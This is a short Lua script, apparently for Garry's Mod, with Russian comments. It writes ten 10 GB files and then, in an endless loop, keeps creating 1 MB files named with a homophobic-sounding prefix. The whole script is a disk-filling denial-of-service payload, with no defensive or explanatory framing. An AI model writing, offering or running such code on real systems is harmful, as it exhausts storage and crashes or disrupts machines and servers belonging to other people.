local one_mb = string.rep("A", 1024 * 1024) -- 1 МБ блок
local fileIndex = 0

-- Шаг 1: 10 файлов по 10 ГБ
for i = 1, 10 do
    fileIndex = fileIndex + 1
    local f = file.Open("Igay_" .. fileIndex .. ".dat", "wb", "DATA")
    if not f then error("Не удалось открыть файл " .. fileIndex) end

    for j = 1, 10240 do -- 10,240 * 1 МБ = 10 ГБ
        f:Write(one_mb)
    end

    f:Close()
    print("[10GB FILE] Created: Igay_" .. fileIndex)
end

-- Шаг 2: бесконечно создавать 1 МБ файлы
while true do
    fileIndex = fileIndex + 1
    local f = file.Open("Igay_" .. fileIndex .. ".dat", "wb", "DATA")
    f:Write(one_mb)
    f:Close()
    print("[1MB FILE] Created: Igay_" .. fileIndex)
end
